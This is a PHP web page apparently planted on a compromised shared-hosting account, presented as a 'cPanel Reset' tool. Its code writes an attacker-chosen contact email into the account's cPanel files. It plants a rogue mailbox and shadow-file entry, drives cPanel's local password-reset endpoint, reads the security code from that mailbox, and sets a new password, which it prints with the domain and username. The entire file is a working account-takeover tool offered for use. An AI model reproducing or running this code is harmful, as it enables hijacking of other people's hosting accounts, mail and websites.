<html>
<head>
<title>Cpanel Reset</title>
<meta charset="UTF-8">
	<meta name="theme-color" content="#1D1D1D"/>
<style>
 @import url(https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,400italic);
body {
	margin: 0;
	font-family: 'Open Sans', Arial, sans-serif;
	background:#1D1D1D;
	background-repeat:no-repeat;
	background-position:absolute;
	background-size:cover;
	color:#FFFFFF;
	height:100%;
}
input[type=text], option, select { 
 	outline: none;
	border: none;
	margin: 0 0 5px 3px;
	padding: 2px 2px 0px 0;
	background:#1D1D1D;
	color: rgba(250,250,255,1);
	font-size:0.9 rem;
	border-bottom: 1px dotted rgba(91,114,127,1);
	}
input[type=submit] {
	background:#F50057;
	color:white;
	margin:0 10px;
  height:27px;
	width: 80px;
  border-radius:40px;
	 font-size:17;
	border:none;
}		 
input[type=submit]:hover {
  background:#D32F2F;
  color:white;
  margin:0 10px;
  height:27px;
  width: 80px;
  border-radius:40px;
  font-size:17;
  border:none;
  }
</style>
</head>
<body>
<center>
<img src="https://i.pinimg.com/originals/b8/38/ed/b838ed9eead6ce4b448bc020883ec881.gif"><br>
<h2>cPanel Reset</h2>
<form method="post">
<input type="hidden" name="resetlocal" value=""/>
<input type="hidden" name="token" value=""/>
<input type="submit" value="reset" name="get3" />
</form><form method="post">
<input type="text" name="email" value="Your Email"autocomplete="off">
<input type="submit" value="submit" name="get" />
</form>
<form method="post">
<br><br>
CODE:<input type="text" name="code" autocomplete="off">
PASS:<input type="text" name="passbaru"autocomplete="off">
<input type="submit" value="submit" name="get2" />
</form>
</center>
<?php

set_time_limit(0);
error_reporting(0);

function CurlPage($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}

function CurlPage2($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}


$pwd = @getcwd();
if(!function_exists('posix_getegid')) {
	$usr = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$usr = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if (empty($usr)) {
	if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
		preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
		$usr = $mxx[1][0];
	}
}
function stylejs($uStyle) {$c = curl_init();curl_setopt($c, CURLOPT_URL, $uStyle);curl_setopt($c, CURLOPT_REFERER, $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);$style_js = curl_exec($c);curl_close($c);return $style_js;}
$domain = $_SERVER['HTTP_HOST'];
if(strstr($domain, 'www.')){
	$domain = str_replace("www.","",$domain);
}
preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
$home = $m2[1][0];
$root = $_SERVER['DOCUMENT_ROOT'];
$ip = "http://localhost:2082";
if(!(is_dir("/home$home$usr/.cpanel"))){echo'There is no cPanel';die();}
$cpanel = CurlPage2($ip);
if(!(preg_match("/resetpass/",$cpanel))){echo'Reset Password Disabled';die();}

$g = $_POST['get'];
$email = $_POST['email'];
$g2 = $_POST['get2'];
$codeSC = $_POST['code'];
$g3 = $_POST['get3'];
$resetlocal = $_POST['resetlocal'];
$token = $_POST['token'];

if (isset($g3) && preg_match("/TEF/",$resetlocal)){
	$smtpname = "scientistscompany-".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyz"),30);
	$pass = "TEF@".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
	$pwd=crypt($pass,'$6$roottn$');
	@mkdir("/home$home$usr/etc/$domain");
	@mkdir("/home$home$usr/mail/$domain");
	@mkdir("/home$home$usr/mail/$domain/$smtpname");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/.Archive");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/.Drafts");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/.Sent");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/.spam");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/.Trash");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/cur");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/new");
	@mkdir("/home$home$usr/mail/$domain/$smtpname/tmp");
	$file1 = "/home$home$usr/mail/$domain/$smtpname/dovecot-acl-list";fwrite(fopen($file1,"a"),'');
	$file2 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidlist";fwrite(fopen($file2,"w"),'3 V1578724087 N1 G6789ba31f76a195e040b0000cb0407e2');
	$file3 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity";fwrite(fopen($file3,"w"),'5e196afc0');
	$file4 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity.5e196afc";fwrite(fopen($file4,"a"),'');
	$file5 = "/home$home$usr/mail/$domain/$smtpname/dovecot.index.log";fwrite(fopen($file5,"a"),'');
	$file6 = "/home$home$usr/mail/$domain/$smtpname/dovecot.list.index.log";fwrite(fopen($file6,"a"),'');
	$file7 = "/home$home$usr/mail/$domain/$smtpname/dovecot.mailbox.log";fwrite(fopen($file7,"a"),'');
	$file8 = "/home$home$usr/mail/$domain/$smtpname/maildirsize";fwrite(fopen($file8,"w"),"2147483647C\n0 0");
	$file9 = "/home$home$usr/mail/$domain/$smtpname/subscriptions";fwrite(fopen($file9,"w"),"V	2\n\nArchive\nDrafts\nSent\nspam\nTrash");
	$smtp = $smtpname.':'.$pwd.':16249:::::'."\r\n";
	$shadow1 = "/home$home$usr/etc/$domain/shadow";
	$shadow2 = "/home$home$usr/etc/shadow";
	$fo=fopen($shadow1,"a");
	fwrite($fo,$smtp);
	$fo2=fopen($shadow2,"a");
	fwrite($fo2,$smtp);
	$email = "$smtpname@$domain";
	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
	$login = CurlPage2("$ip/resetpass",$postLogin);
	if(preg_match("/error-resetpass-disabled/",$login)){echo'Error-two';die();}
	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
	$sendSecurityCode = CurlPage2("$ip/resetpass",$postSendSecurityCode);
	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
		$sendSecurityCode = CurlPage2("$ip/resetpass",$postSendSecurityCode);
	}
	sleep(3);
	$pathe_msg = "/home$home$usr/mail/$domain/$smtpname/new";
	$scan_msg = scandir($pathe_msg);
	foreach($scan_msg as $file_msg) {
		$msg = file_get_contents("$pathe_msg/$file_msg");
		if (preg_match_all('#bold">(.*)</p>#',$msg,$xxx) && $token == "resetpassword"){
			preg_match_all('#bold">(.*)</p>#',$msg,$xxx);
			$codeSC = $xxx[1][0];
		}
	}
	if (empty($codeSC)) {echo'Error-three';die();}
	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
	$injCode = CurlPage2("$ip/resetpass",$postCode);
	$newpass =$_POST['passbaru'];
	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
	$injPassword = CurlPage2("$ip/resetpass",$postPassword);
	echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
}

if(isset($g) && $email != ""){
	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
	$login = CurlPage("$ip/resetpass",$postLogin);
	if(preg_match("/error-resetpass-disabled/",$login)){echo'Error-two';die();}
	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
	$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
		$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	}
echo "\n<br><center><b>Done code send to <font color='lime'>$email</b></center>'";
}

if(isset($g2) && $codeSC != ""){
	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
	$injCode = CurlPage("$ip/resetpass",$postCode);
	$newpass =$_POST['passbaru'];
	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
	$injPassword = CurlPage("$ip/resetpass",$postPassword);
	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
	echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
}

?>